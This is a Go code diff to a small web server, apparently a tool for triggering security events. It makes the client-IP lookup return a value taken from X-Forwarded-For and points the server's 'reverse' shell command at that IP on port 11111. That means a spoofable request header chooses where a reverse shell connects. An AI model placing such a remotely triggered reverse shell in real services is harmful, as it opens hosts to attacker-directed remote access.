@@ -25,7 +25,7 @@ func WebInfoServer(w http.ResponseWriter, r *http.Request) {
 
 	if r.URL.Path == "/" {
 		// show IP address of the client only if the requested URL is "/"
-		print_sender_ip(w, r)
+		get_sender_ip(w, r)
 	} else if r.URL.Path == "/info" {
 		// show more info about the request if the requested URL is "/info"
 		print_req_info(w, r)
@@ -75,8 +75,8 @@ func WebInfoServer(w http.ResponseWriter, r *http.Request) {
 
 }
 
-// print IP address of HTTP request sender
-func print_sender_ip(w http.ResponseWriter, r *http.Request) {
+// Get IP address of HTTP request sender
+func get_sender_ip(w http.ResponseWriter, r *http.Request) string {
 
 	var xff string = r.Header.Get("X-Forwarded-For")
 	var requester_ip_port string = r.RemoteAddr
@@ -84,9 +84,11 @@ func print_sender_ip(w http.ResponseWriter, r *http.Request) {
 	if len(xff) > 0 {
 		ips := strings.Split(xff, ", ")
 		fmt.Fprintf(w, "%s", ips[0])
+		return ips[0]
 	} else {
 		ip_port_slice := strings.Split(requester_ip_port, ":")
 		fmt.Fprintf(w, "%s", strings.TrimSuffix(requester_ip_port, ":"+ip_port_slice[len(ip_port_slice)-1]))
+		return strings.TrimSuffix(requester_ip_port, ":"+ip_port_slice[len(ip_port_slice)-1])
 	}
 }
 
@@ -315,7 +317,7 @@ func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
 	case "reverse":
 		// initiate a reverse shell command to trigger reverse shell event
 		ctx_duration := 30 * time.Second
-		dest_ip := strings.Split(requester_ip_port, ":")[0]
+		dest_ip := get_sender_ip(w, r)
 
 		tcp_port := "11111"
 
